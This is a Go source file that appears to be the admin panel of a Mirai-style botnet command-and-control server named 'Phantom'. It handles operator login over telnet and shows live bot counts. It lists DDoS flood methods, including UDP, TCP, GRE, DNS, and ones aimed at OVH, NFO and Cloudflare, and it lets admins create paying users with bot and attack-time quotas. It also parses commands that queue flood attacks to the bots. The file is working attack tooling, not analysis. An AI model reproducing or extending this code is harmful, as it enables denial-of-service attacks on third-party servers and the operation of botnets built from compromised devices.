package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[01;36mLOGIN\033[01;36m | PHANTOM-NET\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;96mUsername\033[37m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;96mPassword\033[37m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
	//Attempt  Login
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[01;36mChecking login.. \033[01;36mPlease wait \033[01;37m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
    this.conn.Write([]byte("\r\n"))

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
	    this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\r\033[91m[!] Invalid login!\r\n"))
        this.conn.Write([]byte("\033[91mPress any key to exit\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d Fucker's | Phantom | Fucker: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
                this.conn.Write([]byte("\033[2J\033[1H"))
                this.conn.Write([]byte("\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┏━━┓ ┏┓             ┏┓\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┃┏┓┃ ┃┃            ┏┛┗┓\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┃┗┛┃ ┃┗━┓ ┏━━┓ ┏━┓ ┗┓┏┛ ┏━━┓ ┏┓┏┓\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┃┏━┛ ┃┏┓┃ ┃┏┓┃ ┃┏┓┓ ┃┃  ┃┏┓┃ ┃┗┛┃\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┃┃   ┃┃┃┃ ┃┏┓┃ ┃┃┃┃ ┃┗┓ ┃┗┛┃ ┃┃┃┃\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┗┛   ┗┛┗┛ ┗┛┗┛ ┗┛┗┛ ┗━┛ ┗━━┛ ┗┻┻┛\r\n"))
                this.conn.Write([]byte("\r\n"))
                this.conn.Write([]byte("\r\n"))


    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[1;34m" + username + "\x1b[1;35m@\x1b[1;34mphantom\x1b[1;35m~# \033[0m"))
        cmd, err := this.ReadLine(false)

        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
		
			if cmd == "clear" || cmd == "cls" || cmd == "c" {
				this.conn.Write([]byte("\033[2J\033[1H"))
				this.conn.Write([]byte("\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┏━━┓ ┏┓             ┏┓\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┃┏┓┃ ┃┃            ┏┛┗┓\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┃┗┛┃ ┃┗━┓ ┏━━┓ ┏━┓ ┗┓┏┛ ┏━━┓ ┏┓┏┓\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┃┏━┛ ┃┏┓┃ ┃┏┓┃ ┃┏┓┓ ┃┃  ┃┏┓┃ ┃┗┛┃\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┃┃   ┃┃┃┃ ┃┏┓┃ ┃┃┃┃ ┃┗┓ ┃┗┛┃ ┃┃┃┃\r\n"))
                this.conn.Write([]byte("\x1b[1;34m                      ┗┛   ┗┛┗┛ ┗┛┗┛ ┗┛┗┛ ┗━┛ ┗━━┛ ┗┻┻┛\r\n"))
				this.conn.Write([]byte("\r\n"))
				this.conn.Write([]byte("\r\n"))
				continue
			}
		
			if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
                this.conn.Write([]byte("\r\n"))
				this.conn.Write([]byte("\033[01;37m  \033[1;34m METHODS : \033[1;35mATTACK PUSSY    \033[01;37m     \033[0m \r\n"))
				this.conn.Write([]byte("\033[01;37m  \033[1;34m ADMIN : \033[1;35mADD ADMIN    \033[01;37m   \033[0m \r\n"))
				this.conn.Write([]byte("\033[01;37m  \033[1;34m BOTS : \033[1;35mNUMBER BOTS    \033[01;37m      \033[0m \r\n"))
				this.conn.Write([]byte("\033[01;37m  \033[1;34m CREDITS : \033[1;35mCREDITS   \033[01;37m    \033[0m \r\n"))
				this.conn.Write([]byte("\033[01;37m  \033[1;34m CLS/CLEAR : \033[1;35mCLEAR TERMINAL    \033[01;37m    \033[0m \r\n"))
                this.conn.Write([]byte("\r\n"))
				continue
			}
		
			if cmd == "METHODS" || cmd == "methods" { // display methods and how to send an attack
                this.conn.Write([]byte("\r\n"))
                this.conn.Write([]byte("\x1b[1;35m               --> | METHODS | <--                 \r\n"))
                this.conn.Write([]byte("\x1b[1;34m !udp       [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mUDP based flood                                    \x1b[1;35m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !udpplain  [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mUDP flood with less options. optimized higher PPS  \x1b[1;35m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !std       [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mSTD flood ( best method )                          \x1b[1;32m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !greeth    [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mGRE Ethernet flood                                 \x1b[1;32m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !tcp       [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mTCP flood                                          \x1b[1;35m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !stomp     [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mTCP Mixed stomp flood                              \x1b[1;35m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !dns       [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mDNS resolver flood using the targets domain        \x1b[1;32m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !vse       [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mValve source engine specific flood                 \x1b[1;35m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !ack       [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mACK based fLood                                    \x1b[1;35m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !xmas      [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mXMAS rtcp flood                                    \x1b[1;32m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !ts3       [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mTeamSpeak3 Method. (ripping server ram, cpu)       \x1b[1;32m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !ovhkill   [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mBest method for nulling OVH servers                \x1b[1;32m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !nfokill   [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] dport=[\033[1;35mPORT\033[1;34m] \x1b[90m- \x1b[0mBest method for downing NFO servers                \x1b[1;32m\x1b[0m\r\n"))
                this.conn.Write([]byte("\x1b[1;34m !cfnull    [\033[1;35mIP\033[1;34m] [\033[1;35mTIME\033[1;34m] domain=[\033[1;35mdomain\033[1;34m] \x1b[90m- \x1b[0mBest Method for cf / ddos-gaurd                 \x1b[1;32m\x1b[0m\r\n"))
                this.conn.Write([]byte("\r\n"))
				continue
			}
		
			if userInfo.admin == 1 && cmd == "admin" {
                this.conn.Write([]byte("\r\n"))
				this.conn.Write([]byte("\033[01;37m \033[1;34madduser -> \033[1;35mAdd normal user  \033[01;37m\r\n"))
                this.conn.Write([]byte("\r\n"))
				continue
			}
			if cmd == "credits" || cmd == "CREDITS" {
                this.conn.Write([]byte("\r\n"))
				this.conn.Write([]byte("\033[01;37m \033[1;34mOwner: \033[1;35mSTRESSERIT.PRO	          \033[01;37m\r\n"))
				this.conn.Write([]byte("\033[01;37m \033[1;34mDeveloper: \033[1;35mdr0pl3x and f4brizzi \033[01;37m\r\n"))
                this.conn.Write([]byte("\r\n"))
				continue
			}
		
			if cmd == "bots" || cmd == "BOTS" {
			botCount = clientList.Count()
				m := clientList.Distribution()
				for k, v := range m {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;34m%s: \x1b[1;35m%d\033[0m\r\n\033[0m", k, v)))
				}
				this.conn.Write([]byte(fmt.Sprintf("\033[1;34mTotal bots: \033[1;34m[\033[1;35m%d\033[1;34m]\r\n\033[0m", botCount)))
				continue
			}
			
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
        if cmd[0] == '*' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '-' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
